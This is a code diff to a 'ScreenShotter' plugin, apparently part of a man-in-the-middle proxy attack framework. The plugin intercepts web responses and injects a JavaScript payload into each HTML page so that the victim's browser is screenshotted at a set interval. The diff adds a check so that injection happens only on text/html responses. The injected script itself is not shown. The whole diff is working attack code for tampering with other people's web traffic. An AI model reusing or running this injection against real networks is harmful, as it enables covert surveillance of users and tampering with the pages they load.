@@ -24,17 +24,18 @@ class ScreenShotter(Plugin):
                 context.log('[ScreenShotter] Error saving screenshot: {}'.format(e))
 
     def response(self, context, flow):
-        with decoded(flow.response):  # Remove content encoding (gzip, ...)
-            html = BeautifulSoup(flow.response.content.decode('utf-8', 'ignore'))
-            if html.body:
-                tag = html.new_tag('script', type='text/javascript')
-                with open('./core/javascript/screenshot.js', 'r') as payload:
-                    payload = payload.read().replace('SECONDS_GO_HERE', str(context.interval*1000))
-                    tag.append(payload)
-                html.body.append(tag)
-                context.log("[ScreenShotter] Injected JS payload: {}".format(flow.request.host))
+        if flow.response.headers.get_first("content-type", "").startswith("text/html"):
+            with decoded(flow.response):  # Remove content encoding (gzip, ...)
+                html = BeautifulSoup(flow.response.content.decode('utf-8', 'ignore'))
+                if html.body:
+                    tag = html.new_tag('script', type='text/javascript')
+                    with open('./core/javascript/screenshot.js', 'r') as payload:
+                        payload = payload.read().replace('SECONDS_GO_HERE', str(context.interval*1000))
+                        tag.append(payload)
+                    html.body.append(tag)
+                    context.log("[ScreenShotter] Injected JS payload: {}".format(flow.request.host))
 
-                flow.response.content = str(html)
+                    flow.response.content = str(html)
 
     def options(self, options):
         options.add_argument("--interval", dest="interval", type=int, metavar="SECONDS", default=10, help="Interval at which screenshots will be taken (default 10 seconds)")
